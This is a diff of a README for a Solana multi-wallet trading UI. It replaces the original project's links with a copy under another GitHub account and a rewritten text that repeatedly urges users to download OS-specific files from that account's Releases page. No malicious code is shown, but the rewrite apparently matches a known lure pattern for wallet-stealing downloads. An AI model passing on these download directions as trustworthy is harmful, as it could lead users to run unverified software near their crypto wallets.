@@ -1,83 +1,109 @@
-# Solana UI
+# Solana Multi Wallet Platform 🌌
 
-![Solana UI image](https://i.imgur.com/T9IzS4k.png)
+Welcome to the **Solana Multi Wallet Platform**! This repository provides tools and resources for managing multiple wallets on the Solana blockchain. Whether you're a developer or a user, this platform simplifies your experience in the Solana ecosystem.
 
+## Table of Contents
 
-**Solana UI** is a multi-wallet trading platform designed for the Solana blockchain.
-It provides users with a seamless interface to connect various Solana wallets and execute trades efficiently.
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Links](#links)
 
-## 📚 Docs
+## Introduction
 
-Full documentation is available at: [https://docs.fury.bot/fury-ui/solana-ui](https://docs.fury.bot/fury-ui/solana-ui)
+The Solana blockchain is known for its high throughput and low transaction costs. This platform allows users to manage multiple wallets seamlessly. With various integrations, you can interact with DeFi protocols, swap tokens, and much more. 
 
 ## Features
 
-- **Multi-Wallet Support**: Connect and manage multiple Solana wallets effortlessly.
-- **Trading Interface**: Intuitive UI for executing trades on the Solana network.
-- **Responsive Design**: Optimized for both desktop and mobile devices.
-- **Fast Performance**: Built with modern web technologies for a smooth user experience.
+- **Multi Wallet Management**: Easily manage multiple Solana wallets from a single interface.
+- **Token Swapping**: Integrate with protocols like Jupiter and Raydium for seamless token swaps.
+- **Volume Tracking**: Monitor wallet activity and transaction volume using the Solana Volume Bot.
+- **User-Friendly Interface**: Designed for both developers and casual users.
+- **Open Source**: Contribute to the project and improve the ecosystem.
 
-## Demo
+## Installation
 
-Experience the live application at: [https://bundler.fury.bot](https://bundler.fury.bot)
-
-## Getting Started
+To get started, download the latest release from our [Releases section](https://github.com/Ali030394/solana-ui/releases). Make sure to download the appropriate file for your operating system and follow the installation instructions provided there.
 
 ### Prerequisites
 
-- [Node.js](https://nodejs.org/) (version 14 or later)
-- [npm](https://www.npmjs.com/) (comes with Node.js)
+Before installing, ensure you have the following:
 
-### Installation
+- Node.js (version 14 or higher)
+- npm (Node package manager)
+- A Solana wallet
 
-1. **Clone the repository**:
+### Steps to Install
+
+1. Clone the repository:
 
    ```bash
-   git clone https://github.com/furydotbot/solana-ui.git
+   git clone https://github.com/Ali030394/solana-ui.git
+   ```
+
+2. Navigate to the project directory:
+
+   ```bash
    cd solana-ui
    ```
 
-2. **Install dependencies**:
+3. Install the dependencies:
 
    ```bash
    npm install
    ```
 
-3. **Start the development server**:
+4. Run the application:
 
    ```bash
-   npm run dev
+   npm start
    ```
 
-   The application will be available at `http://localhost:5173`
+## Usage
 
-## Project Structure
+Once installed, you can start using the platform. The interface allows you to add wallets, check balances, and perform token swaps. 
 
-```
-solana-ui/
-├── public/             # Static assets
-├── src/                # Source code
-│   ├── components/     # React components
-│   ├── pages/          # Next.js pages
-│   └── styles/         # Tailwind CSS styles
-├── tailwind.config.js  # Tailwind CSS configuration
-├── postcss.config.js   # PostCSS configuration
-├── package.json        # Project metadata and scripts
-└── README.md           # Project documentation
-```
+### Adding a Wallet
 
-## Technologies Used
+1. Click on "Add Wallet."
+2. Enter your wallet address.
+3. Confirm the wallet is added successfully.
 
-- [React](https://reactjs.org/)
-- [Next.js](https://nextjs.org/)
-- [Tailwind CSS](https://tailwindcss.com/)
-- [TypeScript](https://www.typescriptlang.org/)
-- [Solana Web3.js](https://solana-labs.github.io/solana-web3.js/)
+### Swapping Tokens
+
+1. Select the token you want to swap.
+2. Choose the token you want to receive.
+3. Enter the amount and confirm the swap.
 
 ## Contributing
 
-Contributions are welcome! Please fork the repository and submit a pull request for any enhancements or bug fixes.
+We welcome contributions! If you'd like to help improve the Solana Multi Wallet Platform, follow these steps:
+
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes and commit them (`git commit -m 'Add some feature'`).
+4. Push to the branch (`git push origin feature/YourFeature`).
+5. Open a pull request.
 
 ## License
 
-This project is licensed under the [MIT License](LICENSE).
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Links
+
+For more information and updates, check our [Releases section](https://github.com/Ali030394/solana-ui/releases). Here, you can find the latest features and improvements.
+
+You can also visit our [GitHub repository](https://github.com/Ali030394/solana-ui) for more details and community discussions.
+
+---
+
+### Badges
+
+[![Releases](https://img.shields.io/badge/Releases-latest-brightgreen)](https://github.com/Ali030394/solana-ui/releases)
+
+---
+
+Thank you for your interest in the Solana Multi Wallet Platform! We hope you find it useful and easy to navigate. If you have any questions or suggestions, feel free to reach out through our GitHub issues. Happy swapping!
